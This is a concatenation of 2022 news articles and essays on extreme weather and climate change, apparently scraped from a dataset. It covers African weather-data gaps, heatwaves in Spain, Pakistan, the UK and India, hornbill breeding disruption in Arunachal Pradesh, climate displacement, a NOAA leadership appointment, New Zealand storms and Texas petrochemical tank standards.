Earlier this year, a UN report by leading climate scientists said determining climate change risks on the continent currently “relies on evidence from global studies that use data largely from outside of Africa.” The panel said global data, while good at estimating averages across the world, lacks the specifics African nations need to determine how vulnerable they are and how they can best prepare.

Central and north African regions have been singled out by the UN World Meteorological Organization (WMO) as the worst affected by the absence of weather data, which it says leads to significant margins of error in predicting rainfall trends.

This year has seen a severe drought in the Horn and eastern Africa and extreme heat in the northern parts of the continent, while the southern African region has been pummeled by intense cyclones.

The Mo Ibrahim Foundation estimates that some of the countries most vulnerable to extreme weather globally are in Africa, with 20% of the continent’s population at highest risk. A report released by the foundation also estimates that around 10 million people across the continent are already displaced, at least in part because of climate change.

Earlier this year, the UN Secretary-General António Guterres instructed the WMO to ensure that “every person on Earth is protected by early warning systems” within five years. Currently, only 22% of weather stations in Africa meet global reporting requirements for climate observation systems. The UN weather agency is expected to present an action plan to achieve the five-year goal at COP 27.

Evans Mukolwe, a former UN weather scientist, told AP that besides weather station installations and ocean observations, there’s an urgent need to compile available historical data for African countries to inform future predictions. Mukolwe, now a climate and drought monitoring advisor with the Intergovernmental Authority on Development, said Kenya still “holds 20 million analogue weather cards going back to 1896” containing valuable climate information.

“It is in Africa’s and the world’s interest to invest more in climate research and integrate weather information services for effective adaptation and mitigation strategies,” he said.

Ibrahim said that despite a lack of investment in weather services, the continent has already made headway in other areas when it comes to combatting climate change.

“Africa has a great record on climate adaptation,” he said. “We have over 22 countries on the continent where the main sources of energy are renewable, a feat that is unmatched by any other continent, and vast forests that are efficient in carbon capture.”

The term is increasingly inaccurate.

“Natural” basically means that something is not influenced by human beings, and human-made climate change is making extreme weather both more frequent and more extreme. Hurricanes and cyclones now tend to bring more rain than they used to do. In Eastern Africa, severe droughts normally occurred every 10 years or so. Now the region must cope with the excruciatingly third dry year in a row.



The World Meteorological Organization released its State of the Global Climate 2021 report in May. It lists high-impact events for the following categories: heatwaves and wildfires, cold spells and snow, precipitation, flood, drought, tropical cyclones and severe storms. The entire planet is affected. While not every heatwave or blizzard is a disaster, weather events are certainly leading to vast losses and damages. The UN Office for Disaster Risk Reduction warned in April that, at current trends, humanity is experiencing 350 to 500 medium to large-scale disasters a year. The number is set to rise to 560 by 2030. That would imply a global rate of 1.5 disasters every day.

Both climate mitigation and adaptation must become top priorities. Greenhouse-gas emissions are fuelling global heating. Prosperous nations deserve most of the blame, though China and other large emerging powers are catching up fast. All nations, whether rich or poor, must switch to sustainable energy systems.

At the same time, policymakers and community leaders in climate-vulnerable world regions must help communities to adapt. Where settlements are built inappropriately close to riverbanks, for example, flooding will eventually wash away homes. Where groundwater is depleted, the impacts of drought will be worse. Where monocultures replace diverse ecosystems, extreme weather can wreak more havoc.

Resilience of individuals, local communities and entire nations results from good planning, prudent policies and sustainable economic activity. Development must make that happen. As I argued in this space two months ago, the safety and prosperity people enjoy in high-income countries is not simply the result of high purchasing power. How societies are organised matters even more. Where government, private sector, scientific research, the legal system and other sectors interact dynamically, benefits arise in terms of stronger infrastructure, more employment opportunities, better social protection, a general abundance of both private and public goods and broad-based insurance coverage. Sociologists speak of “functional differentiation”. This kind of modernisation improves peoples’ lives.

Unrestrained growth is not the goal, however. Without radical climate mitigation, adaptation will fail everywhere. If global temperatures keep rising, what we call extreme weather today will be considered normal tomorrow, while new extremes will feel even more shocking. The global impacts will be very serious indeed. For example, failing harvests will dramatically compound inflation, and central banks will not be able to do anything about it. One thing is sure, however: we will not be able to blame nature.

Heatwaves in Spain

Spaniards are sweltering in temperatures that are. up to 16C above normal in an unprecedented May heatwave Marcelo Del Pozo/Reuters

High temperature warnings were issued in 10 regions of Spain as the country sweltered in temperatures usually only seen in midsummer.

On Friday, May temperature records were broken in the city of Jaen, Andalusia, which logged a high of 40C.

According to the national weather agency, AEMET, average temperatures in Jaen were 16C higher than normal for this time of year. Elsewhere in Spain, temperatures were at least 7C higher than usual.

An AEMET spokesperson said last week that, if officially confirmed, it could be the first ever heatwave recorded in Spain during the month of May.

Drought in Pakistan

An ongoing heatwave in Pakistan is causing farmers grief as the relentlessly high temperatures damage crops.

On Friday, Pakistan Meteorological Department said that the prevailing heatwave over central and upper Sindh is expected to persist till May 23, with daytime maximum temperatures rising to between 46 and 48C.

According to the Met Office, the temperature was recorded as high as 47C to 49C on Friday in Jacobabad, located in the northwest of Sindh province. The ongoing stress on water reservoirs, crops, vegetables and orchards likely to continue.

Pakistan’s national rice crop is predominantly fed by rain water and it is planted between May and June. The annual rice harvest which occurs from October to December is now at risk.

More than a billion people are at risk of heat-related impacts in the region too, scientists have warned, linking the early onset of an intense summer to climate change.

Tornado in Germany

Freak storms swept across Germany, killing two, causing serious injuries to dozens more and inflicting damage on a massive scale.

Meteorologists warned that heavy rainfall and hail were expected in western and central Germany on Friday, with storms producing wind gusts up to 130 kph. Storms on Thursday had already disrupted traffic, uprooted trees that toppled onto rail tracks and roads, and flooded hundreds of basements in western Germany.

On Friday, a tornado swept through the western German city of Paderborn, injuring dozens of people as it blew away roofs, toppled trees and sent debris flying for miles. 43 people were injured when the storm hit the city, with one woman said to be in a life-threatening condition.

Heavy storm damage was also reported in the nearby town of Lippstadt. A church steeple in was toppled and the German news agency DPA reported that more than 100 people were temporarily trapped in a local open air pool after fallen trees blocked the exit.

Meanwhile authorities in Bavaria said 14 people were injured Friday when the wooden hut they were sheltering in collapsed during a storm at Lake Brombach, south of Nuremberg. Several children were amongst the injured.

Police said two French citizens died after their motorised paraglider was caught by a strong gust of wind shortly after taking off Thursday from an airfield in Ballenstedt, 175 kilometers southwest of Berlin.

Sandstorm in Iraq

The streets of Baghdad were empty today as a massive sandstorm hit the Iraqi capital and several other provinces in the country.

A thick blanket of dust covered roads and buildings in Baghdad with an orange film as airports in the region were closed down.

Many people were taken to hospital and treated for breathing difficulties.

The sandstorm, which is expected to last for two days, is affecting several other middle eastern nations.

Iraq is prone to seasonal sandstorms, but experts and officials have raised the alarm in recent years over their frequency. They say the storms are being exacerbated by record-low rainfall, desertification, and climate change.

The World Bank has warned that Iraq could suffer a 20 per cent drop in water resources by 2050.",Extreme Weather,2022-05-23 07:00:00

The male hornbill, which feeds its mate and offspring, had been found dead on the roadside.
In general, once hornbills nest, breeding is successful.
This extreme and unusual weather appears to have completely disrupted the timing of hornbill nesting.","Researchers monitoring the breeding habits of three hornbill species in the Pakke Tiger Reserve in Arunachal Pradesh for 22 years observed that extreme weather conditions this year disrupted the timing of nesting; there was late nesting and fewer active nests, several of which have already failed.

Zazu, the diminutive red-billed hornbill depicted in the movie The Lion King, is a familiar endearing character. Recently, its cousin, the southern yellow-billed hornbill in the Kalahari Desert, made world headlines. A study found that this small desert-dwelling African hornbill species has been impacted by climate change and is likely to be facing a collapse in breeding by 2027. The study found that from 2008 to 2019, the percentage of occupied nests declined from 52 per cent to 12 per cent, while the percentage of successful breeding attempts declined from 58 per cent to 17 per cent. The mean fledglings produced per nesting attempt used to be more than one but by 2019 had declined to fewer than one.

Poor breeding effort and performance were linked to external factors such as higher temperature, drought during the breeding season, late nesting, and shorter time spent by females in the nests after chick hatching.

The consequences of rising temperatures because of climate change on hornbill breeding are very clear for an African hornbill in an arid region. However, the Asian hornbills in tropical forests in Arunachal Pradesh seem also to be feeling the heat, and the story is messy and complicated for the larger-bodied hornbills in these wet forest habitats.

Hornbills are especially vulnerable to the effects of climate change because of their unique breeding habits. They nest in tree cavities (which they cannot create), with the female entering the nests and sealing herself inside for nearly the duration of the nesting cycle. They have long nesting cycles, which can go up to four to five months for the largest forest hornbill species. The male provides food for the female and the growing chick or chicks. They breed only once and must time their breeding to coincide with periods of higher food availability. There is also evidence that not all adult pairs breed every year.

While many savannah-dwelling African hornbills are largely insectivores, Asian forest hornbills depend mainly on fruits of many rainforest tree species.

In the tropical forests of the Pakke Tiger Reserve in Arunachal Pradesh, we have monitored breeding by the great hornbill (3–4 kg), the wreathed hornbill (2.5 kg), and the Oriental pied hornbill (a much smaller-sized species, weighing 800–900 g) for 22 years. The initial monitoring was from 1997 to 2000, when I was carrying out my PhD study on hornbills. Then, we restarted monitoring from 2004. There are a few gaps in the intervening years. Hornbill nests and habitats in the forests adjoining Pakke are also protected through a community-based conservation programme (known as the Hornbill Nest Adoption programme) by the Nyishi tribe. Since 2012, when this programme began, the team of Nyishi nest protectors monitors the breeding of these species in the adjoining reserved forests near their villages.

We have also tracked the patterns in ripe fruit availability for 17 years. In 2011, we set up a weather station in Seijosa (near the south-eastern part of the reserve) to record temperature, rainfall, humidity, solar radiation, and wind speed.

Hornbill conservation has taken off in other States, too, with local environmental activists and forest departments taking active part.

We track how many nests are active or have attempted breeding in each year. For all active nests, we record the date of female nest entry or date when nesting is initiated. We monitor the nest for the next few months to see whether the nest remains active with the male visiting to feed the female (and the chicks, once they have hatched). We monitor whether the breeding was successful by checking the nests before the expected fledging to record the date when the chick exits the nest. In the larger two hornbills, there is usually only one chick that fledges successfully. Although they are known to lay two eggs, one is only laid as an insurance in case the first one fails. In the Oriental pied hornbill, there can be more than one chick fledging. Knowing both female entry and chick exit dates allows us to calculate the length of the breeding cycle.

The breeding season

The breeding season is from March to July and mid-August. The two larger hornbills start nesting in March, while the Oriental pied starts nesting in the first to second week of April and has an 80- to 90-day nesting cycle. The nesting cycle of the great hornbill is on average four months long. Although the wreathed hornbill is smaller than the great hornbill, it generally has a mean nesting cycle of 130 days. When the great hornbill chicks fledge in early to mid-July, it is the middle of the monsoon, while most of the wreathed hornbill chicks come out some time later, some in early to mid-August.

This was the general pattern over the years, with some variation. In some years, we noted somewhat earlier breeding in the first week of March, but it was usually from the second to the last week of March.

In 2017, we first noted early breeding in the larger hornbills. They initiated nesting in February. The earliest date was February 14, 29 days earlier on average than what we had observed for 17 years. Before 2017, the median nest entry date was March 15.

During my PhD study, I had found that the peak ripe fruit availability of bird-dispersed tree species was from May to July, which coincided with the post-hatching and chick development period. However, the peak ripe fruit availability of 14 important hornbill food tree species shifted from 2011 to 2017. The peak is now in April, and the fruiting is more staggered, from February to July. This pointed to the possibility that the earlier breeding observed in 2017 was linked to the changing availability of fruit. The timing of hornbill breeding coincides with peak fruit availability of bird-dispersed species, and now that the peak has shifted to earlier months, hornbills might be responding to this shift by starting to breed early. Hornbill nesting and fruiting patterns also seem to show some linkage with El Nino/La Nina weather phenomena, but we are yet to fully understand this.

We thought this unusual early nesting would impact their breeding success in some way. However, this did not result in any effect on the length of the breeding cycle and in nesting success in 2017. It appeared they had the flexibility to respond to a change in fruiting patterns.

We waited to see what would happen in 2018. The timing of breeding was “normal” in 2018. In 2019, breeding was again early for most nests: from the end of February to the first week of March. However, in 2019, five out of six great hornbill nests in Pakke failed, and nests were abandoned midway through the breeding season.

This was not normal. In general, once hornbills nest, breeding is successful. Average nesting success for hornbills is around 85 per cent. Nesting success can be affected by human threats in more disturbed habitats, but inside Pakke, owing to the protection provided by Forest Department staff, there are no threats due to poaching or tree felling. The natural causes of nesting failure can be external factors such as predation of chicks at nest (by yellow-throated martens, binturongs), tree falls due to storms, or problems with the cavity such as flooding or cavity floor sinking. There are other intrinsic causes that are hard to determine, such as failure of chick to hatch, death due to starvation or disease, or nest abandonment by the female/male. These failures are likely linked to weather patterns and food availability.

In 2020, we could not monitor most nests because of COVID restrictions and no research permit for part of the time. In 2021, we could only begin nest monitoring in Pakke from April; therefore, we missed the nest entry dates for most nests. But this year, hornbill nesting is unusually late: most birds had not entered the nests in March, a few had entered by mid-April, and there are many that have not initiated breeding.

Out of 13 great hornbill nests, six pairs initiated nesting only by the second week of April. The mean nest entry date was April 2 compared with the long-term average of March 15. The Oriental pied hornbill usually starts nesting in the first week of April, but this year, its mean nest entry date was April 20, 18 days later than the long-term average of April 2. For the wreathed hornbill, the long-term mean nest entry date is March 17, while this year, the mean nest entry date was April 12, with entry dates ranging from March 29 to April 28.

In some nests, the female entered the nest, came out, and re-entered it, doing this several times. This is unusual behaviour. In one nest of a wreathed hornbill pair, the female entered the nest cavity on April 1. However, she was seen outside the nest with the male on April 8, 11, and 17. Finally, on April 28, the female re-entered the nest, and the male was seen feeding the female. In May, there was a heavy storm one night and the tree fell. The female died. There were eggshells inside the nest but no chicks had hatched. She had been inside the nest for just 12 days. It must have been difficult for her to break the seal when the tree fell suddenly. It is sad that the female had to die after being so reluctant to enter the nest. Maybe she had a sense that things would not go well this time.

Hornbills sometimes lose their nest trees during heavy storms. But such instances have been rare since we began monitoring in 1997.

This year, March was unusually hot, with record-breaking temperatures in India. There was unusual weather in Pakke too, with March being very hot and experiencing continuous rain from the end of March and most of April-May, which is not normal for the area. This extreme and unusual weather appears to have completely disrupted the timing of hornbill nesting. On my visit to Pakke in early April, I saw the unusual sight of several adult pairs still flying around inspecting the nests.

In normal years, when hornbills initiate breeding in March, the weather is dry but not too hot. The females need to seal the cavity after entering the nesting. They are often reluctant to enter the nest and must be coaxed by the male to enter. After they go in, they seal the nest, usually with their droppings. In the case of the Oriental pied hornbill, the male also brings clods of mud for sealing. It is no wonder that the females are hesitant as they must remain holed up inside a cramped space with a narrow opening for a very long time. It is dark, damp, and humid inside. The nesting period of the hornbills coincides with the hottest time of the year when maximum temperatures range from 30 to 33 degrees Celsius. It is common to see the female through the cavity opening, perspiring with its beak open. Even in “normal” years, they feel the heat and humidity during the breeding season.

When I analysed the 2022 weather data, I found that the mean maximum temperature in March was 2 degrees warmer than the 10-year average from 2011 to 2021. The total rainfall in April and May was 49 per cent more than the average total rainfall in these two months in the past decade. The mean relative humidity usually ranges from 50 per cent to 70 per cent in March to May. This year, the mean humidity ranged from 70 per cent to 90 per cent.

With long-term data, it is always difficult because before I have completed the analysis, another year goes by and the story changes. The story is yet to be fully understood.

Low fruit availability

In 2017 and 2019, I had thought that the hornbills might be resilient and adapting to climate change by adjusting their timing of breeding, but after this year, I am not sure how they will cope when the weather is unpredictable and there are extreme changes in climate. Fewer hornbill pairs have attempted breeding: only around 40 per cent of nests are active this year and 20 per cent of these have already failed. There is low fruit availability of hornbill food plants this year.

Through our conservation work, we attempt to address other human-driven threats to hornbills such as hunting and habitat loss. These are challenging to accomplish. But how do we address the effects of climate change on hornbill breeding?

The hornbills must be feeling bewildered and helpless with the changing weather. I hope that they will find a way to adapt and be resilient unlike their African cousins. Or that they will have some “good” years in which they will be able to breed more easily and successfully.

People were forced to flee their homes around 38 million times in 2021, bringing the total number of internally displaced people to 59.1 million, as many uprooted in previous years still hadn't returned home.

The majority (22.3 million) of the new displacements were driven by weather-related disasters, including cyclones, floods, wildfires, drought, landslides and extreme temperatures.

Last year flooding in China triggered 1.4 million internal displacements, Hurricane Ida sparked thousands of evacuations in Cuba an the United States, and cyclone Yaas uprooted people in India and Bangladesh in areas already battered by cyclone Amphan the year before.

The impact of climate change on weather is complex and varied, but generally the crisis is making heat waves worse, fuelling the conditions for wildfires and super-charging hurricanes and rainfall.

""Yet weather does not need to mean disasters,"" said Ilan Kelman, professor of disasters and health at University College London.

What makes a hazard like a flood become a disaster depends on how vulnerable or marginalised people are, where and how they live or access to infrastructure like early warning systems.

""Human-caused climate change, in general, does not cause disasters and does not force displacement,"" Prof Kelman told Sky News.

For example, deaths from drought are more due to lacking access to water or alternative livelihoods or planned migration, irrespective of the drought's cause, he said.

The exception is heat-humidity, which climate change change is driving ""into realms beyond our experience and our ability to survive,"" Prof Kelman explained.

""It was terrifyingly lethal in British Columbia last year and in India and Pakistan this year... There is little we can do, except stop the climate change we are causing,"" he urged.

IDMC director Alexandra Bilak told Sky News: ""Displacement is not only a result of environmental change.

""Human-driven factors, such as unsustainable land-use practices, the destruction of ecosystems and large-scale development projects, play a role too,"" she said.

""Climate change can be seen as both a slow and a fast moving crisis,"" said Dr. Lisa Schipper from Oxford University's Environmental Change Institute.

The gradual shift in seasons, rainfall, temperatures create uncertainty and vulnerability, so when extreme events happen, people are less able to cope, making displacement one of the only remaining options, she said.

""Industry prepares its equipment and operators for challenging summer conditions. Persistent, extreme drought and its accompanying weather patterns, however, are out of the ordinary and tend to create extra stresses on electricity supply and demand,"" said Mark Olson, NERC's manager of Reliability Assessments.

On Thursday, NOAA's Climate Prediction Center called for nearly the entire contiguous United States to experience above average temperatures this summer.

The power grid is extremely delicate and electricity supply must always meet electricity demand, experts warn. If not, capacity shortfalls can occur. A shortfall is when there is not enough power being generated to meet demand.

River Forecast Centre head Dave Campbell told reporters that the average snowpack is currently 165 per cent of normal for this time of year, following a cool start to the spring that has seen snowmelt about three or four weeks later than usual.

But that snow is beginning to melt, and rivers in the Interior are starting to reach peak levels, he added.

""We are expecting that with these rivers full, we really are vulnerable to any type of extreme weather events that might occur,"" Campbell said.

That could mean either intense rainfall or unusual heat.

There's currently little risk of hot weather in the short-term forecast, but this weekend is expected to be rainy up and down the B.C. coast., according to Armel Castellan, a warning preparedness meteorologist with Environment and Climate Change Canada.

Castellan said cooler weather is expected to continue until mid-July when things will start warming up.

Emergency Management B.C. is asking people living in areas vulnerable to flooding to pack grab-and-go bags and reach out to friends and family to make contingency plans just in case of an evacuation.

As of Thursday afternoon, there is one flood warning in effect for the Liard River basin in B.C.'s northeast.

Flood watches have been issued for the Skeena River basin, the Dean River below Tanswanket Creek and the Middle Fraser basin. High streamflow advisories are in place in the northwest, the Stikine River basin, the North Thompson and the Fraser River all the way from Quesnel to the Pacific Ocean.

A flood warning is the highest level of advisory issued by the River Forecast Centre. It suggests an evacuation alert may be issued, followed by an evacuation order, meaning people must immediately leave their property.

“Ken has the scientific integrity, trusted leadership, and communication prowess that will take the National Weather Service to even greater heights,” said NOAA Administrator Rick Spinrad, Ph.D. “I have full confidence that he will help create a more weather- and climate-ready nation amid more extreme weather fueled by our changing climate.”

“What an incredible honor it is to serve alongside the heroes of the National Weather Service whose excellence shines through day after day,” said Graham. “I thank Dr. Spinrad for entrusting me with the awesome responsibility and privilege of leading this dedicated team at such an exciting and important time in our history. We’ll accomplish great things together by building on recent progress and prioritizing support of our forecasters. I can’t wait to get started.”

Since April 2018, Graham has served as the director of the National Hurricane Center, leading the nation through numerous hurricanes, including 30 named storms during the record-breaking 2020 hurricane season. His tireless energy to build effective partnerships at all levels of government and his close work with emergency managers underpin the nation’s preparedness ahead of hazardous weather.

Graham has a vast amount of operational field experience. He worked his way up through the ranks at NWS, mostly in field offices, starting out as an intern meteorologist in 1994 at the New Orleans/Baton Rouge weather forecast office.

Before joining the National Hurricane Center, Graham served as the meteorologist-in-charge of the NWS’ New Orleans/Baton Rouge office for 10 years. He notably established two command centers in the wake of the Deepwater Horizon oil spill in 2010 that provided forecasts to help authorities make critical decisions in the five months following the spill. Graham also led the effort to support decision makers in Louisiana and Mississippi with services focused on expected impacts for hurricanes Gustav, Ike, Isaac, and during the historic 2017 season.

Prior to leading the New Orleans/Baton Rouge forecast office, Graham served as the systems operations division chief at NWS’ Southern Region headquarters in Fort Worth, Texas, where he led Hurricane Katrina recovery efforts. He also served as the meteorological service chief at NWS headquarters in Silver Spring, Maryland, and was the meteorologist-in-charge at the local forecast offices in Birmingham, Alabama, and Corpus Christi, Texas.

Graham earned a bachelor’s degree in atmospheric science from the University of Arizona and a master’s degree in geoscience from Mississippi State University. He was recently named the 2022 Weatherperson of the Year offsite link by the Federal Alliance for Safe Homes and was a 2021 finalist offsite link for the Partnership for Public Service’s Samuel J. Heyman Service to America Medal. Graham is a member of the American Meteorological Society, the National Weather Association and the International Association of Emergency Managers.

A native of Phoenix, Graham and his wife, Laura, have three daughters.

Mary C. Erickson, who has served as acting director of the National Weather Service since January, will resume her position as the agency’s deputy director. “Ken is highly respected across the agency as an inspirational leader, tireless builder of trusted partnerships, and consummate champion of the workforce. We look forward to welcoming him back to National Weather Service headquarters, where he will undoubtedly excel in leading the agency into a bright future,” said Erickson.

Jamie Rhome, deputy director of the National Hurricane Center, will assume the role of acting director until a permanent director is named. Rhome has served in a variety of roles at the Hurricane Center since 1999, from forecaster to hurricane and storm surge specialist. Michael Brennan, Ph.D., branch chief of the hurricane specialist unit, will serve as the acting deputy director of the Center for the coming hurricane season.

NOAA’s National Weather Service provides weather, water and climate data, forecasts, warnings, and impact-based decision support services for the protection of life and property and enhancement of the national economy. In partnership with national and local government, the weather enterprise, Weather-Ready Nation Ambassadors, and academia, the National Weather Service is working to build a more Weather-Ready Nation to support community resilience in the face of increasing vulnerability to extreme weather amid a changing climate.",Extreme Weather,2022-06-07 12:00:00

But what are the facts?

The start of the week will be fine and dry with sunny spells for many in England and Wales. However, a series of weak fronts will push into Scotland and Northern Ireland bringing cloudier weather here with a chance of some light rain, especially across the northwest.

From Wednesday onwards while cloud, rain and breezy conditions continue across the northwest, it will become increasingly warm in the south as high pressure builds. This will bring settled conditions allowing temperatures to build day-on-day and for it to become warm, or even hot, for a time by Friday.

Met Office Deputy Chief Meteorologist, Dan Rudman, said; “Temperatures will rise through the week, becoming well above-average by day by Friday when many parts of the southern half of the UK are likely to reach 30C or even 33C in isolated spots.”

“This is the first spell of hot weather this year and it is still unusual for temperature to exceed these values in June. Many areas will also see some warm nights with temperatures expected to be in the mid to high teens overnight.”

Heatwave criteria

A UK heatwave threshold is met when a location records a period of at least three consecutive days with daily maximum temperatures meeting or exceeding the heatwave temperature threshold. The threshold varies by UK county.

Although some parts of England may perhaps meet these heat wave criteria it looks like this spell of warm weather will be relatively short-lived. Milder conditions look likely to return later in the weekend with temperatures trending back to around average for June as we see cooler air push across the country from the northwest.

The highest temperature reached in the UK so far this year is 27.5C at Heathrow on 17th May. It is still relatively unusual for temperature to reach the mid 30C’s in June and you have to go back to 1976 for the highest recorded June UK temperature (records date from 1884). 35.6C was reached at Southampton Mayflower Park on 28th June 1976.

Climate change

An increase in the frequency, duration, and intensity of extreme high-temperature events and heatwaves over recent decades is linked to the observed warming of the planet and can be attributed to human activity. Previous Met Office research has shown that the frequency of high-temperature extreme weather events outnumbers low-temperature extremes by about nine to one.",Extreme Weather,2022-06-13 11:53:00

The wild weather hitting much of New Zealand is far from over, with MetService extending warnings and watches around the country from Monday night through until Tuesday.

MetService meteorologist John Law​ saying there were still more thunderstorms to come especially in the North Island, bringing thunder lightning, hail, heavy bursts of rain, and gusty winds until late Monday night. “We’ve still got some pretty active weather.”

Horowhenua especially was likely to get more “wet weather”, he said, with MetService extending the thunderstorm watch for Kāpiti-Horowhenua, Wellington and Wairarapa until 10pm tonight.

There was a chance these thunderstorms could be severe, bringing heavy rain, large hail greater than 20mm in diameter, strong wind gusts up to 110kph, and possibly some small tornados about coastal areas. If any tornados occur, they will affect very localised areas.

Buller Emergency Management's Operations Centre has been activated amid strong winds and large swells on the West Coast, and a number of coastal homes have suffered moderate flooding.

Buller mayor Jaime Cleine said they are expecting more rain, wind, and high sea swells on Monday night, and more emergency operations staff were travelling in from outside the district.

Large parts of the South Island were also covered in layers of thick snow, which closed several highways on Monday. Road snowfall warnings were in place for the South Island’s Lewis Pass (SH7), Arthur’s Pass (SH73), Porter’s Pass (SH73), Lindis Pass, Crown Range Rd, Milford Rd (SH94) and the Desert Rd (SH1) in the North Island.

The problem is that the compendium uses rainfall data from 1938 to 1958, and rainfall patterns of today are very different from those of the 1940s and 1950s.

Just as the National Weather Service has redrawn its maps, it is time for Texas to redefine extreme weather.”","As the heavy rainfall of Hurricane Harvey thundered down on the Texas Gulf Coast at the end of August 2017, the roof on a massive ExxonMobil storage tank “partially sank.” The collapse caused the facility to release more than 185,000 pounds of pollutants, including carcinogenic compounds like benzene. That same week, Harvey damaged storage tanks at eight other similar facilities.

Petrochemical storage tanks often have floating roofs that sit right above the product, and the unusually heavy rainfall caused tank roofs to sink, partially submerge, or float and release their contents into floodwaters. In total, the storage tanks released 3.1 million of the reported 8.3 million pounds of excess pollution that were emitted during Harvey.

Many of these accidents could have been prevented if the tanks had been designed to account for the heavier rainfall events brought on by climate change, according to a new report by the environmental and consumer rights nonprofit Public Citizen Texas. The report argues that state regulations and industry standards use outdated rainfall data to set minimum thresholds for building storage tanks and other petrochemical equipment. With climate-fueled storms bringing more frequent and heavier rainfall, the facilities are more likely to fail and release toxic chemicals into the air and water, according to the report.

“Natural disasters are being followed by man made chemical disasters,” said Adrian Shelley, Public Citizen’s Texas office director. “If we know of a weakness, then it should be fixed. If these failures happen again, neither industry nor regulators can claim they weren’t warned.”

Extreme weather events on the Gulf Coast are almost always followed by industrial accidents and pollution. Pollution during hurricanes can take several forms. Facilities that choose to shut down in anticipation of a hurricane often release tens of thousands of pounds of emissions as they burn off excess product in the system and wind down operations. Similarly, these facilities release an elevated amount of pollution when they start back up after the rainfall has subsided. Aside from these foreseen emissions, facilities often also face equipment failures of various types. Generators may become submerged and cause power outages. Valves or pipes may break off. And, as was overwhelmingly the case during Harvey, storage tank roofs may sink or be otherwise damaged.

A key cause of such accidents is Texas’ reliance on outdated and inaccurate standards, according to the report. Construction standards in Texas, including those embedded in state statutes and industry handbooks, often rely on definitions of “100-year storms” and “25-year storms.” The former has a 1 percent chance of occurring during any given year, and the latter has a 4 percent chance. State administrative codes refer to Technical Paper 40, a compendium of rainfall frequency published by the Weather Bureau in 1961, to define these storm events.

The problem is that the compendium uses rainfall data from 1938 to 1958, and rainfall patterns of today are very different from those of the 1940s and 1950s. For instance, Hurricane Harvey dropped nearly 20 inches of rain in the first 24 hours, but the paper’s 24-hour rainfall data for Houston tops out at 12 inches.

The Public Citizen report recommends adopting Atlas-14, a set of rainfall data released by the National Oceanographic and Atmospheric Association in 2018, in place of Technical Paper 40. Although Atlas-14 uses data from the 1980s, the rainfall estimates are more accurate than those the state currently uses. It defines 17 inches of rain over 24 hours as a 100-year event and 29.8 inches of rain as a 1,000-year event.

India, the third biggest exporter, stepped in to fill the gap in the global market.

But India banned the export of wheat with immediate effect, although exceptions are being made for some countries. The announcement came just two days after announcing that it was eyeing a record push on wheat shipments this year.

Days ago, India also announced it would restrict sugar exports to stabilize prices and ensure supply. India is the second-largest exporter of sugar in the world.

Before the wheat export ban, India had set a goal of shipping a mammoth 10 million tons this year, looking to capitalize on the global disruptions to wheat supplies from the war and to find new markets for its wheat in Europe, Africa and Asia.

Food security under threat

Amid a severe heat wave and rising domestic prices, India's Directorate of Foreign Trade said the food security of India along with neighboring and vulnerable nations was under threat.

Watch video 01:44 Heat waves push India to ban export of wheat

India saw the hottest March since records began in 1901. Wheat grains usually ripen around this period, which is why they are extra sensitive to heat.

With extreme weather conditions expected to become more common in the future, concerns are being raised about India's food security.

India received requests to supply over 1.5 million tons of wheat from countries that are looking to prevail over the ongoing shortage of the commodity, with the bulk of the request coming from neighboring Bangladesh.

Extreme weather changing growth patterns

Namrata Ginoya, climate resilience expert at the World Resources Institute, says India's food security has become more vulnerable to extreme weather, unpredictable rainfall and other climate factors.

""These events have a quick impact on food production, and since we are continuing on the high-emissions trajectory right now, we will see a lot of impact,"" Ginoya told DW.

Ginoya said there are several ways farmers can adapt to the changing weather conditions, and these practices are being followed on a smaller scale.

""We're seeing summers arrive earlier than the previous years. That is the time when the grains grow in the crop. If the temperature at the time is higher than 30-31 degrees Celsius [86-88 degrees Fahrenheit], it is bad for the growth of grains,"" Ginoya said.

So, farmers can start sowing the grain 10-15 days earlier than usual. Changes can also be made in the irrigation and fertilization of crops, to adapt to the weather,"" she added.

She believes people need to move towards a style of farming in which every stage of production is monitored and researched, and farmers can access and utilize the findings of the research.

""We also need to identify areas where it is sustainable to grow wheat, and regions where it is no longer viable to grow the crop,"" she told DW.

Record temperatures hit India's farmers Air conditioners and blocks of ice India is currently experiencing an exceptional heat wave. Rajgarh, a city of 1.5 million people in central India topped out at 46.5 degrees C (116 degrees F) while thermometers in nine other cities also climbed above the 45 degree mark. No wonder that anything to fight the heat is an easy sell on the streets of New Delhi.

Record temperatures hit India's farmers Heat sets garbage on fire The extremely high temperatures have even ignited a huge garbage dump in India's capital New Delhi. Friederike Otto, a climate scientist at Imperial College in London, notes that such heat waves used to occur about once every 50 years before man-made climate change. Now they occur about once every four years.

Record temperatures hit India's farmers The elderly and the poor at risk According to a 2021 report in The Lancet, India's vulnerability to extreme heat increased by 15% from 1990 to 2019. It is among the top five countries where vulnerable people, such as the elderly and the poor, are most exposed to the dangers of heat waves. Along with Brazil, India has the highest heat-related mortality in the world.

Record temperatures hit India's farmers Heat — a serious threat to health Medical experts are seeing an increased incidence of heat-related illnesses and believe that the high temperatures are a greater threat than an expected fourth wave of COVID-19. But the crisis also brings out solidarity in people. This Calcutta resident is distributing cool water to passersby.

Record temperatures hit India's farmers The extreme heat threatens the wheat harvest Indian farmers are worried about their harvest — not so much because of the current record temperatures but because this March was overall the hottest March since temperature records began in 1901. Wheat grains usually ripen around that month and that's when they are particularly sensitive to heat.

Record temperatures hit India's farmers The harvest shrinks before the eyes of farmers Baldev Singh from Sangrur saw his crop shrink before his eyes as winter did not turn into a cool spring as usual but into unrelenting summer heat. The farmer from Punjab — the state known as India's breadbasket — lost about a fifth of his yield. Other farmers were hit even harder.

Record temperatures hit India's farmers Wheat exports in danger India, the world's second largest producer of wheat, traditionally exports little of it. Faced with shortages due to the Ukraine war, India planned to tap new markets and benefit from increased world prices. But going ahead with this would now create ""a lot of pressure on the domestic availability of wheat,"" says Devinder Sharma, a Chandigarh-based agricultural expert. Author: Philipp Böll



Millet as an alternative

Even with changes in climate practices, wheat and rice may not be able to fulfill the domestic and international demands of the crop.

Under these circumstances, some experts believe it is time to turn to millet, or nutri cereals, to fulfill the food requirements of the world.

""I think we can expect more and more extreme climate events, and heat waves will exacerbate in the future,"" Ruth DeFries, professor of ecology and sustainable development at Columbia University told DW.

""We also know that coarse cereals, or what are now called as nutri cereals, such as jowar, bajra, raagi, have the physiology of being resilient. They have lower water demands and higher tolerance to coarse soils and heat,"" she added.

